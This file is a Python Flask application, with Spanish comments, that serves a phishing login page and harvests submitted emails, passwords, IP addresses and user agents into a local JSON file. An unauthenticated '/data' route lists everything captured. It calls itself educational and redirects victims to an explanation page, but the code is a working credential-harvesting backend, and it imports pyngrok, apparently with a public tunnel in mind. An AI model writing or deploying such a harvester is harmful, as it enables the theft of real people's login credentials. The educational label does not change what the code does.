from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
from pyngrok import ngrok
import json
import os
import datetime

app = Flask(__name__, static_folder='static', template_folder='templates')
CORS(app)


# En lugar de una base de datos real, usaremos un archivo JSON local
# para almacenar temporalmente los datos (solo con fines educativos)
DATA_FILE = 'phishing_data.json'

def initialize_data_file():
    """Inicializa el archivo de datos si no existe"""
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w') as f:
            json.dump([], f)

def save_data(email, password, ip_address, user_agent):
    """Guarda los datos capturados en el archivo JSON"""
    initialize_data_file()
    
    with open(DATA_FILE, 'r') as f:
        data = json.load(f)
    
    # Añadir nueva entrada
    data.append({
        'email': email,
        'password': password,
        'ip_address': ip_address,
        'user_agent': user_agent,
        'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    
    # Guardar datos actualizados
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)
    
    return len(data)

@app.route('/')
def index():
    """Sirve la página principal de phishing"""
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Procesa los datos de inicio de sesión"""
    data = request.json
    email = data.get('email', '')
    password = data.get('password', '')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    # Guarda los datos y obtiene el ID
    entry_id = save_data(email, password, ip_address, user_agent)
    
    return jsonify({
        'success': True,
        'redirect': f'/educational?id={entry_id}'
    })

@app.route('/educational')
def educational():
    """Página educativa que explica el phishing"""
    entry_id = request.args.get('id', '')
    
    # Obtener los datos capturados para mostrarlos
    captured_data = None
    if entry_id and entry_id.isdigit():
        with open(DATA_FILE, 'r') as f:
            data = json.load(f)
        
        if 0 < int(entry_id) <= len(data):
            captured_data = data[int(entry_id) - 1]
    
    return render_template('educational.html', captured_data=captured_data)

@app.route('/data')
def show_data():
    """Muestra todos los datos capturados (solo para el instructor)"""
    initialize_data_file()
    
    with open(DATA_FILE, 'r') as f:
        data = json.load(f)
    
    return render_template('data.html', data=data)

@app.route('/clear', methods=['POST'])
def clear_data():
    """Limpia todos los datos capturados"""
    with open(DATA_FILE, 'w') as f:
        json.dump([], f)
    
    return jsonify({'success': True})

if __name__ == '__main__':
    
    # Ejecutar la aplicación Flask
    app.run(host='127.0.0.1', port=5000, debug=True)
